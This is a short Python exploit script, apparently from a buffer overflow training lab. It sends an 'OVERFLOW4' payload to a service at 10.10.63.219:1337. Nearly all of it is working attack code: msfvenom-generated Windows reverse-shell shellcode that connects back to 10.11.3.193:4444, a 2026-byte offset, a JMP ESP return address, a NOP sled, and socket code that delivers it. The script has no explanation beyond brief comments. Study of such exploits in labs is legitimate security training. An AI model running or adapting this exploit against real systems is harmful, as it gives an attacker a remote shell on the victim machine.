#!/usr/bin/python3
import socket
import struct

def p32(data):
    return struct.pack("<I", data)

host, port = "10.10.63.219", 1337

# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.3.193 LPORT=4444 EXITFUNC=thread -b '\x00\xa9\xcd\xd4' -f py -v shellcode

shellcode =  b""
shellcode += b"\xda\xdb\xb8\xeb\xc5\x23\x48\xd9\x74\x24\xf4"
shellcode += b"\x5b\x2b\xc9\xb1\x52\x31\x43\x17\x83\xc3\x04"
shellcode += b"\x03\xa8\xd6\xc1\xbd\xd2\x31\x87\x3e\x2a\xc2"
shellcode += b"\xe8\xb7\xcf\xf3\x28\xa3\x84\xa4\x98\xa7\xc8"
shellcode += b"\x48\x52\xe5\xf8\xdb\x16\x22\x0f\x6b\x9c\x14"
shellcode += b"\x3e\x6c\x8d\x65\x21\xee\xcc\xb9\x81\xcf\x1e"
shellcode += b"\xcc\xc0\x08\x42\x3d\x90\xc1\x08\x90\x04\x65"
shellcode += b"\x44\x29\xaf\x35\x48\x29\x4c\x8d\x6b\x18\xc3"
shellcode += b"\x85\x35\xba\xe2\x4a\x4e\xf3\xfc\x8f\x6b\x4d"
shellcode += b"\x77\x7b\x07\x4c\x51\xb5\xe8\xe3\x9c\x79\x1b"
shellcode += b"\xfd\xd9\xbe\xc4\x88\x13\xbd\x79\x8b\xe0\xbf"
shellcode += b"\xa5\x1e\xf2\x18\x2d\xb8\xde\x99\xe2\x5f\x95"
shellcode += b"\x96\x4f\x2b\xf1\xba\x4e\xf8\x8a\xc7\xdb\xff"
shellcode += b"\x5c\x4e\x9f\xdb\x78\x0a\x7b\x45\xd9\xf6\x2a"
shellcode += b"\x7a\x39\x59\x92\xde\x32\x74\xc7\x52\x19\x11"
shellcode += b"\x24\x5f\xa1\xe1\x22\xe8\xd2\xd3\xed\x42\x7c"
shellcode += b"\x58\x65\x4d\x7b\x9f\x5c\x29\x13\x5e\x5f\x4a"
shellcode += b"\x3a\xa5\x0b\x1a\x54\x0c\x34\xf1\xa4\xb1\xe1"
shellcode += b"\x56\xf4\x1d\x5a\x17\xa4\xdd\x0a\xff\xae\xd1"
shellcode += b"\x75\x1f\xd1\x3b\x1e\x8a\x28\xac\x2b\x40\x31"
shellcode += b"\xed\x44\x54\x35\xfc\xc8\xd1\xd3\x94\xe0\xb7"
shellcode += b"\x4c\x01\x98\x9d\x06\xb0\x65\x08\x63\xf2\xee"
shellcode += b"\xbf\x94\xbd\x06\xb5\x86\x2a\xe7\x80\xf4\xfd"
shellcode += b"\xf8\x3e\x90\x62\x6a\xa5\x60\xec\x97\x72\x37"
shellcode += b"\xb9\x66\x8b\xdd\x57\xd0\x25\xc3\xa5\x84\x0e"
shellcode += b"\x47\x72\x75\x90\x46\xf7\xc1\xb6\x58\xc1\xca"
shellcode += b"\xf2\x0c\x9d\x9c\xac\xfa\x5b\x77\x1f\x54\x32"
shellcode += b"\x24\xc9\x30\xc3\x06\xca\x46\xcc\x42\xbc\xa6"
shellcode += b"\x7d\x3b\xf9\xd9\xb2\xab\x0d\xa2\xae\x4b\xf1"
shellcode += b"\x79\x6b\x6b\x10\xab\x86\x04\x8d\x3e\x2b\x49"
shellcode += b"\x2e\x95\x68\x74\xad\x1f\x11\x83\xad\x6a\x14"
shellcode += b"\xcf\x69\x87\x64\x40\x1c\xa7\xdb\x61\x35"

cmd = b"OVERFLOW4 "
pattern_length = 2100 # Documentation and keep for length retention
offset = 2026
new_eip = b"BBBB"
jmp_esp = p32(0x625011AF) # must be the correct endianness
nop_sled = b"\x90" * 48  # multiple of 4

payload = b"".join([
            cmd,
            b"A" * offset,
            jmp_esp,            
            nop_sled,
            shellcode,
            b"C" *  (pattern_length - len(new_eip) - offset - len(nop_sled) - len(shellcode)),
        ])

with socket.socket() as s:
    
    s.connect((host,port))
    s.send(payload)

